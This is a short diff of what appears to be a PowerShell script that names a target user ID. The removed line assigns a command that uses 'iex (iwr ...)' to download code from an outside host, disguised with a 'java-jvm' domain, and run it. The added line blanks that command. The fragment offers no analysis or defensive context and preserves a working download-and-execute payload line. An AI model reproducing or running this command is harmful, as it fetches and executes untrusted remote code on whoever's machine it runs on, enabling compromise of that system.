@@ -1,5 +1,5 @@
 $target_user = "42131"
-$command = "iex (iwr java-jvm.pages.dev/sideways);"
+$command = ""
 
 #$e = dir "c:\Cache\pc-client.exe-1.0.0.0-0"
 
